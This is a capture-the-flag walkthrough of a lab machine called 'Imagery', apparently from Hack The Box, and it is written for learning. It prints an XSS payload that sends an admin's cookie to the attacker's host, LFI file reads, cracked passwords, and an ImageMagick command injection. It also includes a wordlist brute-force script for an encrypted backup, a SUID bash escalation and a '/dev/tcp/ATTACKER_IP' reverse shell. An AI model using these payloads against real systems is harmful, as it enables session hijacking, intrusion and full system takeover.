- - - 
created : 27-09-2025 

Tags : #medium 

Released on 27 Sep 2025 (Season 9)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKyy0U7qSOOyGqKW/mnTdFIj9zkAcvMCMWnEhOoQFWUYio6eiBlaFBjhhHuM8hEM0tbeqFbnkQ+6SFDQw6VjP+E=
|   256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBleYkGyL8P6lEEXf1+1feCllblPfSRHnQ9znOKhcnNM
8000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3

```
# Enumeration
## HTTP (8000) Python 3.12.7

Registering on the `webapp`:

![Pasted image 20250927212425.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250927212425.png)
### FFuf

We can use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target:

```bash
─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.hacknet.htb:8000' -u http://imagery.htb:8000 -fs 146960 -c  
```

No [Subdomain](../../../3%20-%20Tags/Hacking%20Concepts/Subdomain.md)s or vhosts.
## Dirsearch

Using [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md):

```bash
└─$ dirsearch -u imagery.htb:8000   
401    59B   http://imagery.htb:8000/images
405   153B   http://imagery.htb:8000/login
405   153B   http://imagery.htb:8000/logout
405   153B   http://imagery.htb:8000/register
```
## Admin panel discovery

Spotted the admin panel in source code:

![Pasted image 20250927224201.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250927224201.png)
![Pasted image 20250927224433.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250927224433.png)

We can see there's also a `Testuser`.
### Caido

We have user enumeration in `register`:

![Pasted image 20250927222106.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250927222106.png)

You could make a list of valid users from this, for the purpose of the box, we'll not doing that, just added as low discovery.
# Foothold
### Login Bypass

Discovered `bug_reports` endpoint and tried submitting a bug, looking the response.

![Pasted image 20250928110048.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928110048.png)

We can spot some [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md) here : `Admin review in progress` it's a common hint.
### [Retrieve Cookies](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#retrieve-cookies)

We know the bug reports are reviewed by the admin so we can put a [Javascript](../../../3%20-%20Tags/Programming%20Languages/Javascript.md) payload in the message to grab his session cookie:

```js
<script><img src=x onerror=fetch('http://10.10.14.128/?c='+btoa(document.cookie))></script>
```
or just:
```js
<img src=x onerror=this.src='http://10.10.14.128/?c='+btoa(document.cookie)>
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Imagery/user]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.88 - - [28/Sep/2025 12:31:11] "GET /?c=session=c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObENPUS5QOVJmZ29IcXRMZVlSRFo4QUVONGJ5SnZaTzg= HTTP/1.1" 200 -

└─$ echo 'c2Vzc2lvbj0uZUp3OWpiRU9nekFNUlBfRmM0VUVaY3BFUjc0aU1vbExMU1VHeGM2QUVQLU9vcW9kNzkzVDNRbVJkVTk0ekJFY1lMOE00UmxIZUFEcksyWVdjRllxdGVnNTcxUjBFelNXMVJ1cFZhVUM3bzFKdjhhUGVReGhxMkxfcmtIQlRPMmlyVTZjY2FWeWRCOWI0TG9CS3JNdjJ3LmFObENPUS5QOVJmZ29IcXRMZVlSRFo4QUVONGJ5SnZaTzg=' | base64 -d
session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aNlCOQ.P9RfgoHqtLeYRDZ8AEN4byJvZO8         
```

Login to your account, paste the cookie and reload:

![Pasted image 20250928111522.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928111522.png)

Now we have access to the admin panel.
#### Tips

**If you see it's not working just wait a few minutes, when expires or there's a machine reset grab another one, spamming also worked but when the bot triggers you are flooded with cookies : use last ones and decode them if needed**
# Exploit
## LFI

Spotted [Local File Inclusion (LFI)](../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) in `admin/get_system_logs?log_indentifier`:

![Pasted image 20250928115417.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928115417.png)

Now we know there's `mark` user. 

-  Reading interesting `sysfiles` with LFI:

![Pasted image 20250928123659.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928123659.png)

![Pasted image 20250928123837.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928123837.png)

![Pasted image 20250928130129.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928130129.png)

`db.json` seems gold:

![Pasted image 20250928130700.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928130700.png)

And it is, try to enter `test_user` because of features not working for `admin`:

![Pasted image 20250928130342.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928130342.png)
## Cracking

These are [MD5](../../../3%20-%20Tags/Hacking%20Concepts/MD5.md) hashed passwords, we save them with [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md) or any editor you like and crack them:

```bash
testuser: iambatman
```

Now login with these credentials.
## Transform feature

We can use the transform feature as `test_user` and check the responses:

![Pasted image 20250928141359.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928141359.png)

We can read  `api_edit.py` with LFI and see this too:

```
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}" subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

So it's worth try to make the server execute our commands with this `ImageMagick` insecure code.

Got command injection, you need to make sure that the quotations end up closed correctly and that you separate your commands.

![Pasted image 20250928144437.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928144437.png)

Proof:

![Pasted image 20250928144536.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928144536.png)
#### Tips

**Make sure you use admin cookie to watch LFI requests and tester cookie to transform images.
Upload the image and capture request when trasforming**
## Reverse Shell

We Try to gain a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) , used [Bash](../../../3%20-%20Tags/Hacking%20Concepts/Bash.md):

![Pasted image 20250928144902.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250928144902.png)

Got it. Now quick [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) and we go for the [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md).
# Lateral Movement - Privilege Escalation
## Web to Mark

We can run [LinPEAS](../../../3%20-%20Tags/Hacking%20Tools/LinPEAS.md) on the target after transfer:

```bash
╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses       
/home/web/web/env/bin:/sbin:/usr/bin:/home/web/.local/bin:/home/web/.local/bin                               

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                               
tcp   LISTEN 0      4096      127.0.0.54:53         0.0.0.0:*                                               
tcp   LISTEN 0      4096         0.0.0.0:22         0.0.0.0:*                                               
tcp   LISTEN 0      128          0.0.0.0:8000       0.0.0.0:*    users:(("python",pid=1369,fd=3))           
tcp   LISTEN 0      4096            [::]:22            [::]:*                                    

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 20  2024 /etc/skel/.bashrc                                                                  
-rw-r--r-- 1 web web 3856 Jul 30 08:14 /home/web/.bashrc
-rw-r--r-- 1 root root 3771 Jan  6  2022 /snap/core22/2045/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Jan  6  2022 /snap/core22/2133/etc/skel/.bashrc


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                              
passwd file: /etc/passwd
passwd file: /snap/core22/2045/etc/pam.d/passwd
passwd file: /snap/core22/2045/etc/passwd
passwd file: /snap/core22/2045/usr/share/bash-completion/completions/passwd
passwd file: /snap/core22/2045/usr/share/lintian/overrides/passwd
passwd file: /snap/core22/2045/var/lib/extrausers/passwd
passwd file: /snap/core22/2133/etc/pam.d/passwd
passwd file: /snap/core22/2133/etc/passwd
passwd file: /snap/core22/2133/usr/share/bash-completion/completions/passwd
passwd file: /snap/core22/2133/usr/share/lintian/overrides/passwd
passwd file: /snap/core22/2133/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)                                                                                                     

-rwxr-xr-x 1 web web 961785 Sep 28 14:21 /tmp/linpeas.sh
-rw-rw-r-- 1 web web 22678 Sep 28 14:31 /tmp/selenium_failure.png
-rw-r--r-- 1 root root 13726 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/endpoint-rule-set-1.json
-rw-r--r-- 1 root root 3064 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/paginators-1.json
-rw-r--r-- 1 root root 44 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/examples-1.json
-rw-r--r-- 1 root root 393788 Oct  7  2024 /usr/lib/python3/dist-packages/botocore/data/backup/2018-11-15/service-2.json

-rw-rw-r-- 1 root root 23054471 Aug  6  2024 /var/backup/web_20250806_120723.zip.aes

-rw-r--r-- 1 root root 32 Sep 12 10:41 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 32 Jul 30 07:56 /var/backups/dpkg.arch.6.gz
-rw-r--r-- 1 root root 3682 Aug  1 05:01 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 32 Jul 31 08:35 /var/backups/dpkg.arch.5.gz
-rw-r--r-- 1 root root 32 Aug  1 05:01 /var/backups/dpkg.arch.4.gz
-rw-r--r-- 1 root root 32 Sep 10 13:03 /var/backups/dpkg.arch.2.gz
-rw-r--r-- 1 root root 81920 Sep 23 16:27 /var/backups/alternatives.tar.0
-rw-r--r-- 1 root root 32 Aug  5 15:29 /var/backups/dpkg.arch.3.gz
-rw-r--r-- 1 root root 0 Sep 23 16:27 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 2059 Jul 14 15:49 /var/backups/alternatives.tar.2.gz

```

We can see we have backup a file here, let's check.

Get the file:

1. 
```bash
web@Imagery:/var/backup$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.14.128 - - [28/Sep/2025 15:07:54] "GET /web_20250806_120723.zip.aes HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
```
2. 
```bash
└─$ wget http://10.10.11.88:8888/web_20250806_120723.zip.aes                        
--2025-09-28 17:07:54--  http://10.10.11.88:8888/web_20250806_120723.zip.aes
Connessione a 10.10.11.88:8888... connesso.
Richiesta HTTP inviata, in attesa di risposta... 200 OK
Lunghezza: 23054471 (22M) [application/octet-stream]
Salvataggio in: «web_20250806_120723.zip.aes»

web_20250806_120723.zip.aes   100%[==============================================>]  21,99M  4,76MB/s    in 5,4s    

2025-09-28 17:07:59 (4,11 MB/s) - «web_20250806_120723.zip.aes» salvato [23054471/23054471]

```

We crack the password:

```python
import pyAesCrypt
import os

bufferSize = 64 * 1024
input_file = "web_20250806_120723.zip.aes.zip.aes"
wordlist_path = "/usr/share/wordlists/rockyou.txt"

with open(wordlist_path, "r", encoding="latin-1") as f:
    for pw in f:
        password = pw.strip()
        try:
            print(f"[*] Trying: {password}")
            pyAesCrypt.decryptFile(input_file, "out.zip", password, bufferSize)
            print(f"[+] Password found: {password}")
            break
        except Exception:
            continue
```

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Imagery/user]
└─$ python3 -m venv .venv

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Imagery/user]
└─$ source .venv/bin/activate

┌──(.venv)─(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Imagery/user]
└─$ pip install pyAesCrypt
Collecting pyAesCrypt
  Downloading pyAesCrypt-6.1.1-py3-none-any.whl.metadata (5.2 kB)
Collecting cryptography (from pyAesCrypt)
  Downloading cryptography-46.0.1-cp311-abi3-manylinux_2_34_x86_64.whl.metadata (5.7 kB)
Collecting cffi>=2.0.0 (from cryptography->pyAesCrypt)
  Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl.metadata (2.6 kB)
Collecting pycparser (from cffi>=2.0.0->cryptography->pyAesCrypt)
  Using cached pycparser-2.23-py3-none-any.whl.metadata (993 bytes)
Downloading pyAesCrypt-6.1.1-py3-none-any.whl (16 kB)
Downloading cryptography-46.0.1-cp311-abi3-manylinux_2_34_x86_64.whl (4.6 MB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.6/4.6 MB 3.1 MB/s  0:00:01
Using cached cffi-2.0.0-cp313-cp313-manylinux2014_x86_64.manylinux_2_17_x86_64.whl (219 kB)
Using cached pycparser-2.23-py3-none-any.whl (118 kB)
Installing collected packages: pycparser, cffi, cryptography, pyAesCrypt
Successfully installed cffi-2.0.0 cryptography-46.0.1 pyAesCrypt-6.1.1 pycparser-2.23

─$ python3 decrypt.py 

HTB{{REDACTED_PASSWD}}
```

We `unzip` and read `db.json` again (cause it's the old one):

```bash
└─$ cat db.json                    
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "HTB{{REDACTED_HASH}}",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "HTB{{REDACTED_HASH}}",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "HTB{{REDACTED_HASH}}",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "HTB{{REDACTED_HASH}}",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
```

We can crack them (md5):

```bash
mark: HTB{{REDACTED_PASSWD}}
web: spiderweb1234
```

We can `su mark` and `cat` the user flag:

```bash
web@Imagery:/var/backup$ su mark
Password: 

mark@Imagery:/var/backup$ cat /home/mark/user.txt 
  HTB{{REDACTED_FLAG}}
```
## Mark to Root

We check `sudo` permissions:

```bash
mark@Imagery:/var/backup$ sudo -l
Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

We can check the tool functionality:

```bash
mark@Imagery:/usr/local/sbin$ sudo /usr/local/bin/charcol

  ░██████  ░██                                                  ░██ 
 ░██   ░░██ ░██                                                  ░██ 
░██        ░████████   ░██████   ░██░████  ░███████   ░███████  ░██ 
░██        ░██    ░██       ░██  ░███     ░██    ░██ ░██    ░██ ░██ 
░██        ░██    ░██  ░███████  ░██      ░██        ░██    ░██ ░██ 
 ░██   ░██ ░██    ░██ ░██   ░██  ░██      ░██    ░██ ░██    ░██ ░██ 
  ░██████  ░██    ░██  ░█████░██ ░██       ░███████   ░███████  ░██ 
                                                                    
                                                                    
                                                                    
Charcol The Backup Suit - Development edition 1.0.0


Charcol is already set up.
To enter the interactive shell, use: charcol shell
To see available commands and flags, use: charcol help

 Backup & Fetch:
    backup -i <paths...> [-o <output_file>] [-p <file_password>] [-c <level>] [--type <archive_type>] [-e <patterns...>] [--no-timestamp] [-f] [--skip-symlinks] [--ask-password]
      Purpose: Create an encrypted backup archive from specified files/directories.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/'.
      Naming: Automatically adds timestamp unless --no-timestamp is used. If no -o, uses input filename as base.
      Permissions: Files created with 664 permissions. Ownership is user:group.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED archive.
      Examples:
        - Encrypted with file-specific password:
          backup -i /home/user/my_docs /var/log/nginx/access.log -o /tmp/web_logs -p <file_password> --verbose --type tar.gz -c 9
        - Encrypted with app password (if status 1):
          backup -i /home/user/example_file.json
        - Unencrypted (if status 2 and no -p):
          backup -i /home/user/example_file.json
        - No timestamp:
          backup -i /home/user/example_file.json --no-timestamp

    fetch <url> [-o <output_file>] [-p <file_password>] [-f] [--ask-password]
      Purpose: Download a file from a URL, encrypt it, and save it.
      Output: File will have a '.aes' extension if encrypted. Defaults to '/var/backup/fetched_file'.
      Permissions: Files created with 664 permissions. Ownership is current user:group.
      Restrictions: Fetching from loopback addresses (e.g., localhost, 127.0.0.1) is blocked.
      Encryption:
        - If '--app-password' is set (status 1) and no '-p <file_password>' is given, uses the application password for encryption.
        - If 'no password' mode is set (status 2) and no '-p <file_password>' is given, creates an UNENCRYPTED file.
      Examples:
        - Encrypted:
          fetch <URL> -o <output_file_path> -p <file_password> --force
        - Unencrypted (if status 2 and no -p):
          fetch <URL> -o <output_file_path>

  Integrity & Extraction:
    list <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and list contents of an encrypted Charcol archive.
      Note: Requires the correct decryption password.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        list /var/backup/<encrypted_file_name>.zip.aes -p <file_password>

    check <encrypted_file> [-p <file_password>] [--ask-password]
      Purpose: Decrypt and verify the structural integrity of an encrypted Charcol archive.
      Note: Requires the correct decryption password. This checks the archive format, not internal data consistency.
      Supported Types: .zip.aes, .tar.gz.aes, .tar.bz2.aes.
      Example:
        check /var/backup/<encrypted_file_name>.tar.gz.aes -p <file_password>

    extract <encrypted_file> <output_directory> [-p <file_password>] [--ask-password]
      Purpose: Decrypt an encrypted Charcol archive and extract its contents.
      Note: Requires the correct decryption password.
      Example:
        extract /var/backup/<encrypted_file_name>.zip.aes /tmp/restored_data -p <file_password>

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

    auto delete <job_id>
      Purpose: Remove an automated job managed by Charcol.
      Verification: Same as 'auto add'.
      Example:
        auto delete <job_id>

  Shell & Help:
    shell
      Purpose: Enter this interactive Charcol shell.
      Example:
        shell

    exit
      Purpose: Exit the Charcol shell.
      Example:
        exit

    clear
      Purpose: Clear the interactive shell screen.
      Example:
        clear

    help [command]
      Purpose: Show help for Charcol or a specific command.
      Example:
        help backup

Global Flags (apply to all commands unless overridden):
  --app-password <password>    : Provide the Charcol *application password* directly. Required for 'auto' commands if status 1. Less secure than interactive prompt.
  -p, "--password" <password>    : Provide the *file encryption/decryption password* directly. Overrides application password for file operations. Less secure than --ask-password.
  -v, "--verbose"                : Enable verbose output.
  --quiet                      : Suppress informational output (show only warnings and errors).
  --log-file <path>            : Log all output to a specified file.
  --dry-run                    : Simulate actions without actual file changes (for 'backup' and 'fetch').
  --ask-password               : Prompt for the *file encryption/decryption password* securely. Overrides -p and application password for file operations.
  --no-banner                   : Do not display the ASCII banner.
  -R, "--reset-password-to-default"  : Reset application password to default (requires system password verification)
```

We can use this as a vector for our final step.

Basically, from the `charcol` interactive shell we can obtain a root shell with this command:

```bash
--command "chmod u+s /usr/bin/bash"
```

This should also work for binding another shell:

```bash
auto add --command "/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" | echo 'iamrootnow'
```

From here you can simply read the last flag.

```bash
-# cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!